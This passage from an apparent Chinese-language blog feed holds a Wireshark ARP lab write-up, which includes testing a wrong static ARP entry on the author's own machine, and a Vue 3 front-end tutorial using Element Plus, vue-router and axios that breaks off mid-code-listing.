the ARP message contain the IP address of the sender?</li><li>c)ARP消息是否包含发送方的IP地址？</li></ul></blockquote><p><img src="/posts/76311f61/image-20220512171819649.png" alt="image-20220512171819649"></p><p>是的，会包含</p><p>如图，该ARP请求包含的发送方IP地址为192.168.1.105</p><blockquote><ul><li><p>d) Where in the ARP request does the “question” appear – the Ethernet address of the machine whose corresponding IP address is being queried?</p></li><li><p>d)在ARP请求中问题出现在哪里-正在查询其相应IP地址的机器的以太网地址？</p></li></ul></blockquote><p><img src="/posts/76311f61/image-20220512172016452.png" alt="image-20220512172016452"></p><p>&quot;target MAC address”字段设置为 00:00:00:00:00:00</p><p>这表明它当前目的mac地址未知，它正在查询其对应 IP 地址（192.168.1.1)的机器的mac地址</p><h3 id="13"><a class="markdownIt-Anchor" href="#13"></a> 13.</h3><blockquote><p>Now find the ARP reply that was sent in response to the ARP request.</p><ul><li>a) How many bytes from the very beginning of the Ethernet frame does the ARP opcode field begin?</li><li>b) What is the value of the opcode field within the ARP-payload part of the Ethernet frame in which an ARP response is made?</li><li>c) Where in the ARP message does the “answer” to the earlier ARP request appear – the IP address of the machine having the Ethernet address whose corresponding IP address is being queried?</li></ul><p>现在查找响应ARP请求而发送的ARP回复。</p><ul><li>a)ARP操作码字段从以太网帧的开头开始多少个字节？</li></ul></blockquote><p><img src="/posts/76311f61/image-20220512172138145.png" alt="image-20220512172138145"></p><p>和上题一样</p><p>ARP 操作码字段从以太网帧最开始的20 个字节后开始</p><blockquote><ul><li>b)在进行ARP响应的以太网帧的ARP有效负载部分中，操作码字段的值是多少？</li></ul></blockquote><p>如图，可以发现是0x0002，该字段用于表示回复</p><blockquote><ul><li>c)在ARP消息中，对先前ARP请求的“回答”出现在哪里–具有正在查询其相应IP地址的以太网地址的机器的IP地址？</li></ul></blockquote><p><img src="/posts/76311f61/image-20220512172410321.png" alt="image-20220512172410321"></p><p>之前的 ARP 请求的回答出现在“sender MAC address”字段中，其中包含 IP 地址为 192.168.1.1 的发送方的以太网地址 00:06:25:da:af:73</p><h3 id="14"><a class="markdownIt-Anchor" href="#14"></a> 14.</h3><blockquote><p>What are the hexadecimal values for the source and destination addresses in the Ethernet frame containing the ARP reply message?</p><p>包含ARP回复消息的以太网帧中源地址和目的地址的十六进制值是多少？</p></blockquote><p>源地址的十六进制值为 00:06:25:da:af:73 ，目标地址为 00:d0:59:a9:3d:68</p><p><img src="/posts/76311f61/image-20220512172717516.png" alt="image-20220512172717516"></p><h3 id="15"><a class="markdownIt-Anchor" href="#15"></a> 15.</h3><blockquote><p>Open the ethernet-ethereal-trace-1 trace file in <a href="http://gaia.cs.umass.edu/wireshark-labs/wireshark-traces.zip">http://gaia.cs.umass.edu/wireshark-labs/wireshark-traces.zip</a>. The first and second ARP packets in this trace correspond to an ARP request sent by the computer running Wireshark, and the ARP reply sent to the computer running Wireshark by the computer with the ARP-requested Ethernet address. But there is yet another computer on this network, as indicated by packet 6 – another ARP request. Why is there no ARP reply (sent in response to the ARP request in packet 6) in the packet trace?Figure 4.25 in the text shows the NAT translation table in the NAT router.Using your answers to 1-8 above, fill in the NAT translation table entries for HTTP connection considered in questions 1-8 above.</p><p>在-1\f25 <a href="http://gaia.cs.umass.edu/wireshark-labs/wireshark-traces.zip.-1%5Cf6%E4%B8%AD%E6%89%93%E5%BC%80-1%5Cf25">http://gaia.cs.umass.edu/wireshark-labs/wireshark-traces.zip.-1\f6中打开-1\f25</a> ETERNET-Etheral-TRACE-1\f6跟踪文件。</p><p>此跟踪中的第一个和第二个ARP数据包对应于运行Wireshark的计算机发送的ARP请求，以及使用ARP请求的以太网地址的计算机向运行Wireshark的计算机发送的ARP回复。但此网络上还有另一台计算机，如数据包6所示-另一个ARP请求。</p><p>为什么在信息包跟踪中没有ARP回复(响应信息包6中的ARP请求而发送)？正文中的图4.25显示了NAT路由器中的NAT转换表。使用您对上述1-8的答案，填写上述问题1-8中考虑的HTTP连接的NAT转换表项</p></blockquote><p>因为查询APR报文是在广播帧中发送的（子网中的所有电脑都能收到），而响应APR报文在一个标准帧中发送（只有发送请求的那台电脑能收到）。</p><h2 id="extra-credit"><a class="markdownIt-Anchor" href="#extra-credit"></a> Extra Credit:</h2><blockquote><p>EX-1. The arp command:</p><p>arp -s InetAddr EtherAddr</p><p>allows you to manually add an entry to the ARP cache that resolves the IP address InetAddr to the physical address EtherAddr. What would happen if, when you manually added an entry, you entered the correct IP address, but the wrong Ethernet address for that remote interface?</p><p>EX-2. What is the default amount of time that an entry remains in your ARP cache before being removed. You can determine this empirically (by monitoring the cache contents) or by looking this up in your operation system documentation.<br>Indicate how/where you determined this value.</p><p>ex-1</p><p>Arp命令：arp-s InetAddr EtherAddr允许您手动向ARP缓存添加条目，将IP地址InetAddr解析为物理地址EtherAddr。当您手动添加条目时，如果您为该远程接口输入了正确的IP地址，但输入了错误的以太网地址，会发生什么情况？</p></blockquote><h3 id="ex1"><a class="markdownIt-Anchor" href="#ex1"></a> EX1</h3><p>会无法访问这个IP地址</p><p>下面通过实验来佐证这一点结论</p><p>通过网线连接另一台主机，并手动其IP地址为192.168.0.3，关闭防火墙</p><p>并将自己主机的以太网IP地址设置为192.168.0.4</p><p>首先实验前需要先清空arp缓存</p><p>这时我们ping这个IP地址，可以发现，可以直接ping通</p><p><img src="/posts/76311f61/image-20220512192410378.png" alt="image-20220512192410378"></p><p>查看此时的arp缓存：</p><p><img src="/posts/76311f61/image-20220512192504380.png" alt="image-20220512192504380"></p><p>可以看到，如图192.168.0.4表示以太网接口下的ARP缓存表</p><p>其中192.168.0.3此时的物理地址被缓存的正是对方的物理地址</p><p><img src="/posts/76311f61/QO%5DJJS%5BA8V29X_Q2%60SB%7D@I.png" alt="对方主机mac地址"></p><p>此时我们尝试通过arp -s来手动添加一条arp缓存</p><p><img src="/posts/76311f61/image-20220512192917906.png" alt="image-20220512192917906"></p><p>查看添加结果，可以发现，我们并没有将其添加至希望的以太网接口下，而是到了我的WLAN接口下，这使得这种情况下我们还是可以正常ping通对方，因为此时以太网接口下的ARP转发表中该IP地址的缓存仍是动态的，且mac地址正确。</p><p>这个应该是arp -s命令的局限性</p><p><img src="/posts/76311f61/image-20220512193009399.png" alt="image-20220512193009399"></p><p>但是我们可以尝试另一个命令来添加arp缓存到指定的网络接口</p><p>首先我们通过如下命令来得到以太网接口的索引值</p><p><img src="/posts/76311f61/image-20220512193214131.png" alt="image-20220512193214131"></p><p>然后通过下面的命令来指定以太网接口从而为其主动分配一个具有错误mac地址的arp缓存</p><p><img src="/posts/76311f61/image-20220512193321733.png" alt="image-20220512193321733"></p><p>我们再次查看arp缓存</p><p><img src="/posts/76311f61/image-20220512193356993.png" alt="image-20220512193356993"></p><p>可以看到，此时其物理地址已经变成了我们手动分配的一个错误的mac地址</p><p>这时我们再次尝试ping这个地址，就发现无法ping通了</p><p><img src="/posts/76311f61/image-20220512193525317.png" alt="image-20220512193525317"></p><p>清空arp缓存后再试一次，这时又可以了</p><p><img src="/posts/76311f61/image-20220512193603582.png" alt="image-20220512193603582"></p><p>上述结果充分证明了，当我们为一个arp缓存分配一个错误的mac地址后，我们就会无法访问这个IP地址了，因为当我们缓存中有该IP地址时，我们的计算机就不会再发出arp请求去请求它的mac地址，而是直接通过缓存访问，如果是错误的，那自然无法访问了。</p><h3 id="ex2"><a class="markdownIt-Anchor" href="#ex2"></a> EX2</h3><blockquote><p>ex-2</p><p>条目在被删除之前在ARP缓存中保留的默认时间是多少。您可以通过经验(通过监视缓存内容)或通过在操作系统文档中查找来确定这一点。<br>指明您确定此值的方式/地点。</p></blockquote><p>通过查阅资料，我得到了如下信息：</p><h4 id="arp动态条目的生命周期"><a class="markdownIt-Anchor" href="#arp动态条目的生命周期"></a> ARP动态条目的生命周期</h4><p>保留时间也就是ARP表的老化时间</p><ul><li>不同系统的ARP表老化时间不同，Windows.2000/XP系统ARP表项的老化时间是2分钟，95/98以及NT系就是10分钟，大部分Cisco交换机是5分钟，华为的设备一般是20分种</li><li>这些时间可以通过系统注册表或者设备的相关命令进行设置。</li></ul><p>我们可以也可以通过命令行来查看其动态条目的老化时间</p><p>linux下：</p><p>可以看到其时间是30000ms,即30s</p><p><img src="/posts/76311f61/image-20220512201010141.png" alt="image-20220512201010141"></p><p>windows 10下：</p><p>也是30s</p><p><img src="/posts/76311f61/image-20220512201107933.png" alt="image-20220512201107933"></p><h4 id="arp静态条目的生命周期"><a class="markdownIt-Anchor" href="#arp静态条目的生命周期"></a> ARP静态条目的生命周期</h4><p>静态条目一直保留在ARP缓存中，意思是永久生效。</p><p>但不同的操作系统中，静态条目的保存方式是不同的。</p><p>有些系统重启后仍会有效，如旧版windows但有些重启后就会失效，如linux</p><p>尝试了目前的windows11和linux Ubuntu20.04 重启后静态条目均会消失。</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Lab</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot+Vue前后端分离项目之前端vue部分</title>
    <link href="/posts/3de7737d/"/>
    <url>/posts/3de7737d/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这个vue项目是上一篇基于spring boot的java web数据库操作的后端项目的前端实现</p><p>用vue实现了与SpringBoot后端进行数据交互，完成插入、删除、展示数据库数据等功能。</p></blockquote><h2 id="一-环境准备"><a class="markdownIt-Anchor" href="#一-环境准备"></a> 一、环境准备</h2><p>Node.js</p><h3 id="安装vue脚手架"><a class="markdownIt-Anchor" href="#安装vue脚手架"></a> 安装vue脚手架</h3><p><a href="https://cli.vuejs.org/zh/guide/installation.html">vue官网</a></p><p>通过下面的命令安装</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">npm install -g @vue/cli<br></code></pre></div></td></tr></table></figure><h2 id="二-项目创建"><a class="markdownIt-Anchor" href="#二-项目创建"></a> 二、项目创建</h2><p>构建vue脚手架</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">vue create ex4vue<br></code></pre></div></td></tr></table></figure><p>vue版本选择vue3</p><p>开始运行项目</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">npm run serve<br></code></pre></div></td></tr></table></figure><p>成功后有如下提示</p><p><img src="/posts/3de7737d/image-20220418135440067.png" alt="image-20220418135440067"></p><p>我们进入网址，会看到如下初始界面</p><p><img src="/posts/3de7737d/image-20220204110547005.png" alt="img"></p><h2 id="三-vue项目的一些基本命令"><a class="markdownIt-Anchor" href="#三-vue项目的一些基本命令"></a> 三、vue项目的一些基本命令</h2><ul><li>启动项目：在 Vue 项目的根目录中打开 cmd ，运行命令🛠<code>npm run serve</code></li><li>停止项目：在运行 Vue 项目的命令行窗口按快捷键 ctrl + C</li><li>安装插件：在 Vue 项目的根目录中打开 cmd，运行命令🛠<code>npm install xxx</code></li></ul><h2 id="四-vue项目结构"><a class="markdownIt-Anchor" href="#四-vue项目结构"></a> 四、vue项目结构</h2><p><img src="/posts/3de7737d/image-20220418135828473.png" alt="image-20220418135828473"></p><ul><li><p><strong>public 文件夹</strong></p><ul><li><p>**favicon.ico：**页面的图标</p></li><li><p>**index.html：**页面的总入口，Vue项目一般是一个单页应用，也就是只有一个页面，我们看到的页面变化其实都是在这个页面中对某个组件进行局部刷新，这个页面中存在一个 id 为 app 的 div 标签，这个标签就是 App.vue 这个根组件的挂载点，可以简单理解为框架会把 App.vue 这个根节点放到 index.html 中的<code>&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;</code>这个位置</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&lt;%= htmlWebpackPlugin.options.title %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- built files will be auto injected --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p><strong>src 文件夹</strong></p><ul><li>**assets 文件夹：**资源文件，如存放一些图片 css 文件等</li><li>**components 文件夹：**项目的公共组件，就是一些整个项目都有可能用到的组件，如一些公用的弹窗、输入框、按钮等</li></ul></li><li><p>**App.vue：**项目的根组件，其他所有组件都包含在这个组件里，作为它的子组件或孙子组件</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;<br>  &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot;/&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import HelloWorld from &#x27;./components/HelloWorld.vue&#x27;<br><br>export default &#123;<br>  name: &#x27;App&#x27;,<br>  components: &#123;<br>    HelloWorld<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br>#app &#123;<br>  font-family: Avenir, Helvetica, Arial, sans-serif;<br>  -webkit-font-smoothing: antialiased;<br>  -moz-osx-font-smoothing: grayscale;<br>  text-align: center;<br>  color: #2c3e50;<br>  margin-top: 60px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></div></td></tr></table></figure></li><li><p>**main.js：**整个项目的入口文件，在运行<code>npm run serve</code>命令时首先就运行了 main.js 这个文件，主要用来创建 Vue 实例，并作为桥梁将 App.vue 组件挂载到 index.html 中，此文件还负责全局引入一些插件并安装插件等功能，如引入 Element plus</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><br>createApp(App).mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br></code></pre></div></td></tr></table></figure></li></ul><p>最终项目结构：</p><p><img src="/posts/3de7737d/image-20220418140312538.png" alt="image-20220418140312538"></p><p>其中router是新建的文件夹，里面放的是路由控制文件，用来作为一整个项目的路由，HelloWorld.vue留在了项目中，其实就是个测试文件，我用来放一些测试过程的组件</p><h2 id="五-项目构建"><a class="markdownIt-Anchor" href="#五-项目构建"></a> 五、项目构建</h2><h3 id="1引入element-plus"><a class="markdownIt-Anchor" href="#1引入element-plus"></a> 1.引入Element Plus</h3><blockquote><p>Element UI 是由饿了么公司开发的一套桌面组件库，像一些表格、按钮、时间选择器等都可以直接使用，且简洁美观</p><p>官网：<a href="https://element-plus.gitee.io/zh-CN/guide/installation.html">Element Plus</a></p></blockquote><p>安装Element Plus</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">npm install element-plus --save<br></code></pre></div></td></tr></table></figure><p>修改main.js文件，改为如下</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> ElementPlus <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-plus&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-plus/dist/index.css&#x27;</span><br><br><span class="hljs-keyword">const</span> app = createApp(App)<br><br>app.use(ElementPlus)<br><br>app.mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br><br></code></pre></div></td></tr></table></figure><h3 id="2引入路由"><a class="markdownIt-Anchor" href="#2引入路由"></a> 2.引入路由</h3><blockquote><p>在写网站应用的过程中，离不开一个功能，就是页面的跳转，而在 Vue 这种单页应用中，一个网站就只有一个页面，我们看到所谓页面的“跳转”其实只是同一个页面中的局部组件的刷新，而路由的指的是浏览器地址栏中的路径与组件有着一一对应的关系，当输入指定的地址时，页面中的某个区域的组件会替换成该地址对应的组件。</p><p>官网：<a href="https://router.vuejs.org/zh/installation.html#%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD-cdn">vue-router</a></p></blockquote><p>安装</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">npm install vue-router@4<br></code></pre></div></td></tr></table></figure><p>新建一个router文件，然后在其中建立一个router.js文件</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// 此文件专门负责项目的路由</span><br><br><span class="hljs-comment">// 引入组件</span><br><br><span class="hljs-keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><span class="hljs-comment">// 还有 createWebHashHistory 和 createMemoryHistory</span><br><span class="hljs-keyword">import</span> IndexPage <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/IndexPage&#x27;</span><br><span class="hljs-keyword">import</span> HelloWorld <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/HelloWorld&#x27;</span><br><span class="hljs-keyword">import</span> ListPage <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/ListPage&#x27;</span><br><span class="hljs-keyword">const</span> router = createRouter(&#123;<br>    <span class="hljs-attr">history</span>: createWebHistory(),<br>    <span class="hljs-attr">routes</span>: [<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,          <span class="hljs-comment">// 路径</span><br>            <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;/index&#x27;</span>  <span class="hljs-comment">// 重定向</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/index&#x27;</span>,     <span class="hljs-comment">// 路径</span><br>            <span class="hljs-attr">component</span>: IndexPage    <span class="hljs-comment">// 跳转到的组件</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/list&#x27;</span>,<br>            <span class="hljs-attr">component</span>: ListPage<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/test&#x27;</span>,<br>            <span class="hljs-attr">component</span>: HelloWorld<br>        &#125;,<br>    ],<br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router;<br></code></pre></div></td></tr></table></figure><p>修改main.js</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> ElementPlus <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-plus&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-plus/dist/index.css&#x27;</span><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./router&#x27;</span><br><br><span class="hljs-keyword">const</span> app = createApp(App)<br><br>app.use(ElementPlus)<br>app.use(router)<br>app.mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br><br></code></pre></div></td></tr></table></figure><h3 id="3引入axios"><a class="markdownIt-Anchor" href="#3引入axios"></a> 3.引入axios</h3><blockquote><p>axios简单理解就是用来帮助我们实现网络数据请求的一个插件，我们可以通过它与后端进行数据交互</p><p>官网：<a href="http://www.axios-js.com/zh-cn/docs/#%E5%AE%89%E8%A3%85">axios</a></p></blockquote><p>安装</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">npm install axios<br></code></pre></div></td></tr></table></figure><h3 id="4设计indexpage"><a class="markdownIt-Anchor" href="#4设计indexpage"></a> 4.设计indexPage</h3><p>该组件是起始页面，用来进行表单输入和校验</p><p>具体代码如下，相关分析见注释</p><p>在这里面我们通过axio调用了后端项目的接口，实现了前后端的交互。</p><p>最终效果如图</p><p><img src="/posts/3de7737d/image-20220418162346687.png" alt="image-20220418162346687"></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span 